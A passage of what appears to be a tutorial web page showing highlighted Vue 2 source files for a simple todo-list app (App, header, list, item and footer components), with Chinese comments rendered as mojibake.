class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-container&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-wrap&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">MyHeader</span> <span class="hljs-attr">:addTodo</span>=<span class="hljs-string">&quot;addTodo&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">MyList</span> <span class="hljs-attr">:todos</span>=<span class="hljs-string">&quot;todos&quot;</span> <span class="hljs-attr">:checkTodo</span>=<span class="hljs-string">&quot;checkTodo&quot;</span> <span class="hljs-attr">:deleteTodo</span>=<span class="hljs-string">&quot;deleteTodo&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">MyFooter</span> <span class="hljs-attr">:todos</span>=<span class="hljs-string">&quot;todos&quot;</span> </span><br><span class="hljs-tag">                  <span class="hljs-attr">:checkAllTodo</span>=<span class="hljs-string">&quot;checkAllTodo&quot;</span> <span class="hljs-attr">:clearAllTodo</span>=<span class="hljs-string">&quot;clearAllTodo&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">MyHeader</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/MyHeader&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">MyList</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/MyList&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">MyFooter</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/MyFooter.vue&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">components</span>: &#123; <span class="hljs-title class_">MyHeader</span>, <span class="hljs-title class_">MyList</span>, <span class="hljs-title class_">MyFooter</span> &#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// ç”±äºtodosæ˜¯MyHeaderç»„ä»¶å’ŒMyFooterç»„ä»¶éƒ½åœ¨ä½¿ç”¨ï¼Œæ‰€ä»¥æ”¾åœ¨Appä¸­ï¼ˆçŠ¶æ€æå‡ï¼‰</span></span><br><span class="language-javascript">        <span class="hljs-attr">todos</span>:[</span><br><span class="language-javascript">          &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;æŠ½çƒŸ&#x27;</span>,<span class="hljs-attr">done</span>:<span class="hljs-literal">true</span>&#125;,</span><br><span class="language-javascript">          &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;002&#x27;</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;å–é…’&#x27;</span>,<span class="hljs-attr">done</span>:<span class="hljs-literal">false</span>&#125;,</span><br><span class="language-javascript">          &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;003&#x27;</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;å¼€è½¦&#x27;</span>,<span class="hljs-attr">done</span>:<span class="hljs-literal">true</span>&#125;</span><br><span class="language-javascript">        ]</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-comment">//æ·»åŠ ä¸€ä¸ªtodo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">addTodo</span>(<span class="hljs-params">todoObj</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">unshift</span>(todoObj)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">//å‹¾é€‰orå–æ¶ˆå‹¾é€‰ä¸€ä¸ªtodo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">checkTodo</span>(<span class="hljs-params">id</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>)=&gt;</span>&#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">if</span>(todo.<span class="hljs-property">id</span> === id) todo.<span class="hljs-property">done</span> = !todo.<span class="hljs-property">done</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">//åˆ é™¤ä¸€ä¸ªtodo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">deleteTodo</span>(<span class="hljs-params">id</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">filter</span>( <span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> todo.<span class="hljs-property">id</span> !== id )</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">//å…¨é€‰orå–æ¶ˆå…¨é€‰</span></span><br><span class="language-javascript">      <span class="hljs-title function_">checkAllTodo</span>(<span class="hljs-params">done</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>)=&gt;</span>&#123;</span><br><span class="language-javascript">          todo.<span class="hljs-property">done</span> = done</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">//æ¸…é™¤æ‰€æœ‰å·²ç»å®Œæˆçš„todo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">clearAllTodo</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>)=&gt;</span>&#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">return</span> !todo.<span class="hljs-property">done</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-comment">/*base*/</span></span><br><span class="language-css">  <span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.btn</span> &#123;<span class="hljs-attribute">display</span>: inline-block;<span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">12px</span>;<span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">0</span>;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">20px</span>;<span class="hljs-attribute">text-align</span>: center;<span class="hljs-attribute">vertical-align</span>: middle;<span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="language-css">    <span class="hljs-attribute">box-shadow</span>: inset <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.2</span>), <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">2px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.05</span>);</span><br><span class="language-css">    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.btn-danger</span> &#123;<span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#da4f49</span>;<span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#bd362f</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.btn-danger</span><span class="hljs-selector-pseudo">:hover</span> &#123;<span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#bd362f</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.btn</span><span class="hljs-selector-pseudo">:focus</span> &#123;<span class="hljs-attribute">outline</span>: none;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.todo-container</span> &#123;<span class="hljs-attribute">width</span>: <span class="hljs-number">600px</span>;<span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.todo-container</span> <span class="hljs-selector-class">.todo-wrap</span> &#123;<span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;<span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;MyHeader.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-header&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;è¯·è¾“å…¥ä½ çš„ä»»åŠ¡åç§°ï¼ŒæŒ‰å›è½¦é”®ç¡®è®¤&quot;</span> </span><br><span class="hljs-tag">           <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;title&quot;</span> @<span class="hljs-attr">keyup.enter</span>=<span class="hljs-string">&quot;add&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">import</span> &#123;nanoid&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;nanoid&#x27;</span></span><br><span class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;MyHeader&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">props</span>:[<span class="hljs-string">&#x27;addTodo&#x27;</span>],<span class="hljs-comment">// æ¥æ”¶ä»Appä¼ é€’è¿‡æ¥çš„addTodo</span></span><br><span class="language-javascript"><span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript"><span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript"><span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">// æ”¶é›†ç”¨æˆ·è¾“å…¥çš„title</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript"><span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript"><span class="hljs-title function_">add</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-comment">// æ ¡éªŒæ•°æ®</span></span><br><span class="language-javascript"><span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">this</span>.<span class="hljs-property">title</span>.<span class="hljs-title function_">trim</span>()) <span class="hljs-keyword">return</span> <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;è¾“å…¥ä¸èƒ½ä¸ºç©º&#x27;</span>)</span><br><span class="language-javascript"><span class="hljs-comment">// å°†ç”¨æˆ·çš„è¾“å…¥åŒ…è£…æˆä¸€ä¸ªtodoå¯¹è±¡</span></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> todoObj = &#123; <span class="hljs-attr">id</span>:<span class="hljs-title function_">nanoid</span>(), <span class="hljs-attr">title</span>:<span class="hljs-variable language_">this</span>.<span class="hljs-property">title</span>, <span class="hljs-attr">done</span>:<span class="hljs-literal">false</span> &#125;</span><br><span class="language-javascript"><span class="hljs-comment">// é€šçŸ¥Appç»„ä»¶å»æ·»åŠ ä¸€ä¸ªtodoå¯¹è±¡</span></span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addTodo</span>(todoObj)</span><br><span class="language-javascript"><span class="hljs-comment">// æ¸…ç©ºè¾“å…¥</span></span><br><span class="language-javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">title</span> = <span class="hljs-string">&#x27;&#x27;</span></span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">&#125;,</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-comment">/*header*/</span></span><br><span class="language-css"><span class="hljs-selector-class">.todo-header</span> <span class="hljs-selector-tag">input</span> &#123;<span class="hljs-attribute">width</span>: <span class="hljs-number">560px</span>;<span class="hljs-attribute">height</span>: <span class="hljs-number">28px</span>;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;<span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;<span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">7px</span>;&#125;</span><br><span class="language-css"><span class="hljs-selector-class">.todo-header</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:focus</span> &#123;<span class="hljs-attribute">outline</span>: none;<span class="hljs-attribute">border-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">82</span>, <span class="hljs-number">168</span>, <span class="hljs-number">236</span>, <span class="hljs-number">0.8</span>);</span><br><span class="language-css"><span class="hljs-attribute">box-shadow</span>: inset <span class="hljs-number">0</span> <span class="hljs-number">1px</span> <span class="hljs-number">1px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.075</span>), <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">82</span>, <span class="hljs-number">168</span>, <span class="hljs-number">236</span>, <span class="hljs-number">0.6</span>);&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;MyList.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-main&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">MyItem</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;todoObj in todos&quot;</span><span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;todoObj.id&quot;</span> </span><br><span class="hljs-tag">            <span class="hljs-attr">:todo</span>=<span class="hljs-string">&quot;todoObj&quot;</span> <span class="hljs-attr">:checkTodo</span>=<span class="hljs-string">&quot;checkTodo&quot;</span><span class="hljs-attr">:deleteTodo</span>=<span class="hljs-string">&quot;deleteTodo&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">MyItem</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./MyItem&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;MyList&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">components</span>:&#123;<span class="hljs-title class_">MyItem</span>&#125;,</span><br><span class="language-javascript">    <span class="hljs-comment">// å£°æ˜æ¥æ”¶Appä¼ é€’çš„æ•°æ®ï¼Œå…¶ä¸­todosæ˜¯è‡ªå·±ç”¨çš„ï¼ŒcheckTodoå’ŒdeleteTodoæ˜¯ç»™å­ç»„ä»¶MyItemç”¨çš„</span></span><br><span class="language-javascript">    <span class="hljs-attr">props</span>:[<span class="hljs-string">&#x27;todos&#x27;</span>,<span class="hljs-string">&#x27;checkTodo&#x27;</span>,<span class="hljs-string">&#x27;deleteTodo&#x27;</span>]</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-comment">/*main*/</span></span><br><span class="language-css">  <span class="hljs-selector-class">.todo-main</span> &#123;<span class="hljs-attribute">margin-left</span>: <span class="hljs-number">0px</span>;<span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;<span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;<span class="hljs-attribute">padding</span>: <span class="hljs-number">0px</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.todo-empty</span> &#123;<span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;<span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;<span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;</span><br><span class="language-css">    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;<span class="hljs-attribute">padding-left</span>: <span class="hljs-number">5px</span>;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;MyItem.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- å¦‚ä¸‹ä»£ç ä¹Ÿèƒ½å®ç°åŠŸèƒ½ï¼Œä½†æ˜¯ä¸å¤ªæ¨èï¼Œå› ä¸ºæœ‰ç‚¹è¿ååŸåˆ™ï¼Œå› ä¸ºä¿®æ”¹äº†props --&gt;</span><br>      <span class="hljs-comment">&lt;!-- &lt;input type=&quot;checkbox&quot; v-model=&quot;todo.done&quot;/&gt; --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">:checked</span>=<span class="hljs-string">&quot;todo.done&quot;</span> @<span class="hljs-attr">change</span>=<span class="hljs-string">&quot;handleCheck(todo.id)&quot;</span>/&gt;</span>  <br>      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123; todo.title &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;handleDelete(todo.id)&quot;</span>&gt;</span>åˆ é™¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;MyItem&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-comment">//å£°æ˜æ¥æ”¶todoã€checkTodoã€deleteTodo</span></span><br><span class="language-javascript">    <span class="hljs-attr">props</span>:[<span class="hljs-string">&#x27;todo&#x27;</span>,<span class="hljs-string">&#x27;checkTodo&#x27;</span>,<span class="hljs-string">&#x27;deleteTodo&#x27;</span>],</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-comment">// å‹¾é€‰orå–æ¶ˆå‹¾é€‰</span></span><br><span class="language-javascript">      <span class="hljs-title function_">handleCheck</span>(<span class="hljs-params">id</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">checkTodo</span>(id)<span class="hljs-comment">// é€šçŸ¥Appç»„ä»¶å°†å¯¹åº”çš„todoå¯¹è±¡çš„doneå€¼å–å</span></span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">// åˆ é™¤</span></span><br><span class="language-javascript">      <span class="hljs-title function_">handleDelete</span>(<span class="hljs-params">id</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span>(<span class="hljs-title function_">confirm</span>(<span class="hljs-string">&#x27;ç¡®å®šåˆ é™¤å—ï¼Ÿ&#x27;</span>))&#123;</span><br><span class="language-javascript">          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">deleteTodo</span>(id)<span class="hljs-comment">// é€šçŸ¥Appç»„ä»¶å°†å¯¹åº”çš„todoå¯¹è±¡åˆ é™¤</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-comment">/*item*/</span></span><br><span class="language-css">  <span class="hljs-selector-tag">li</span> &#123;<span class="hljs-attribute">list-style</span>: none;<span class="hljs-attribute">height</span>: <span class="hljs-number">36px</span>;<span class="hljs-attribute">line-height</span>: <span class="hljs-number">36px</span>;<span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">5px</span>;</span><br><span class="language-css">    <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">label</span> &#123;<span class="hljs-attribute">float</span>: left;<span class="hljs-attribute">cursor</span>: pointer;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">label</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">input</span> &#123;<span class="hljs-attribute">vertical-align</span>:middle; <span class="hljs-attribute">margin-right</span>:<span class="hljs-number">6px</span>; <span class="hljs-attribute">position</span>:relative;<span class="hljs-attribute">top</span>: -<span class="hljs-number">1px</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">button</span> &#123;<span class="hljs-attribute">float</span>: right;<span class="hljs-attribute">display</span>: none;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">3px</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:before</span> &#123;<span class="hljs-attribute">content</span>: initial;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:last-child</span> &#123;<span class="hljs-attribute">border-bottom</span>: none;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:hover</span>&#123;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ddd</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-tag">li</span><span class="hljs-selector-pseudo">:hover</span> <span class="hljs-selector-tag">button</span>&#123;<span class="hljs-attribute">display</span>: block;&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;MyFooter.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 